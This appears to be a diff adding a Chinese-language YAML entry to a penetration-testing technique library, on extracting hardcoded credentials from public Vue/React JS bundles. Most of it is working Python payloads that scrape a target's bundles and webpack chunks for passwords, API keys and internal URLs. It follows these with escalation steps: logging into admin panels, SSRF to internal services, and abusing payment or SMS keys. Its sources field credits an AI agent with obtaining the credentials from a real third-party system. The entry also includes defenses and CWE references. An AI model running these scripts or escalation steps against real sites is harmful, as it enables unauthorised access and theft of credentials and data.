@@ -1,0 +1,105 @@
+id: "auth-hardcoded-creds-js-bundle"
+name: "SPA JS Bundle 硬编码凭据与密钥提取"
+category: "auth"
+subcategory: "information-disclosure"
+severity: "high"
+
+description: |
+  Vue/React 前端应用在构建时将内部账号、API Key、外部服务凭据等敏感信息
+  硬编码于 JS Bundle 中并公开分发。攻击者无需任何认证，下载 bundle 文件后
+  通过正则匹配即可提取完整凭据，直接用于横向渗透或数据访问。
+
+  实战案例：某 TG 推广系统公开 JS bundle（app.xxxxxxxx.js）中硬编码了：
+  - 内部账号 int-admin / 密码 ********
+  - API Key api-key-xxxxxxxxxxxxxxxx
+  - 外部服务地址 payment-svc.example.com + 完整 API 路径 /Login, /GetUsers, /AddUser
+  - 内网端口 :8081 的文件服务
+
+trigger_signals:
+  - "目标为 SPA（Vue/React/Vite），JS 文件通过 /static/js/ 或 /_next/static/ 公开"
+  - "JS 文件体积较大（>500KB），可能包含配置信息"
+  - "URL 中可见带 hash 的 chunk 文件（app.xxxxx.js, index-xxxxx.js）"
+  - "应用有内部管理功能或对接多个外部服务"
+
+payloads:
+  - technique: "批量下载并提取 JS Bundle 中的凭据"
+    payload: |
+      import requests, re
+
+      base = "http://target"
+      # 1. 获取主页，提取 JS 文件列表
+      html = requests.get(base).text
+      js_files = re.findall(r'src=["\']([^"\']+\.js)["\']', html)
+
+      for js_path in js_files:
+          url = base + js_path if js_path.startswith("/") else js_path
+          code = requests.get(url, timeout=10).text
+
+          # 2. 提取常见凭据模式
+          patterns = {
+              "password": r'(?:password|pwd|passwd|secret)["\s:=]+["\']([^"\']{4,50})["\']',
+              "api_key":  r'(?:api_?key|apikey|token|secret)["\s:=]+["\']([A-Za-z0-9]{16,64})["\']',
+              "account":  r'(?:username|account|user)["\s:=]+["\']([^"\']{3,30})["\']',
+              "url":      r'https?://[a-zA-Z0-9._/-]{10,80}',
+          }
+          for name, pattern in patterns.items():
+              for m in re.findall(pattern, code, re.IGNORECASE)[:5]:
+                  print(f"  [{name}] {m}")
+    note: "正则覆盖主流命名格式，实际提取后需人工验证"
+
+  - technique: "webpack chunk 枚举"
+    payload: |
+      # 从主 bundle 提取 chunk ID 与 hash 映射
+      import re, requests
+      main_js = requests.get("http://target/static/js/app.HASH.js").text
+      # 提取 {chunkId: "hash"} 格式
+      chunks = re.findall(r'"(\d+)"\s*:\s*"([a-f0-9]{8})"', main_js)
+      for cid, chash in chunks:
+          chunk_url = f"http://target/static/js/{cid}.{chash}.js"
+          chunk = requests.get(chunk_url).text
+          # 在 chunk 中搜索敏感字符串
+          if any(k in chunk for k in ["password", "apikey", "secret", "internal"]):
+              print(f"Chunk {cid}: sensitive content found ({len(chunk)} chars)")
+    note: "webpack 分包策略下，凭据往往在非主 bundle 的小 chunk 中"
+
+success_indicators:
+  - "在 JS 文件中找到明文 password 字段值（非占位符）"
+  - "API Key 字符串可在外部服务中验证（返回 200 而非 401）"
+  - "提取的用户名/密码组合能在内部 API 返回不同于'账号不存在'的响应"
+  - "发现内部服务地址（内网 IP 或隐藏子域名）"
+
+prerequisites:
+  - "目标为 SPA 前端，JS 文件通过 HTTP/HTTPS 公开可下载"
+  - "开发者在前端代码中保留了调试/内部账号配置"
+  - "构建工具（webpack/vite）未对敏感字符串混淆或加密"
+
+upgrade_paths:
+  - "用提取的凭据登录内部管理后台或外部关联服务"
+  - "发现内网服务地址后进行 SSRF 或直连攻击"
+  - "提取的 API Key 用于调用后端接口获取数据"
+  - "发现其他第三方服务（支付、短信）的 key 可滥用消耗资源"
+
+defense:
+  - "CI/CD 流程中接入 secrets scanning（如 truffleHog, gitleaks）"
+  - "前端代码中所有配置通过运行时环境变量注入，不硬编码"
+  - "JS Bundle 中不出现任何 password/secret/apikey 明文"
+  - "对 JS 文件设置适当的访问控制（后台专用 JS 不公开）"
+  - "敏感操作统一在后端完成，前端仅传递用户输入"
+
+sources:
+  - agent: "cursor-sonnet-pentest"
+    date: "2026-07-21"
+    note: "实战获取自某 TG 推广系统，app.xxxxxxxx.js 明文包含 int-admin/******** 及 API Key"
+  - ref: "CWE-312: Cleartext Storage of Sensitive Information"
+  - ref: "CWE-798: Use of Hard-coded Credentials"
+  - ref: "OWASP WSTG-CONF-05: Enumerate Infrastructure and Application Admin Interfaces"
+
+tools:
+  - "requests (Python)"
+  - "regex / ripgrep"
+  - "truffleHog（secrets scan）"
+confidence: "high"
+limitations:
+  - "混淆严重的 bundle 难以提取可读字符串"
+  - "硬编码的账号可能是已停用的测试账号"
+  - "提取的内网地址可能从公网无法直达"
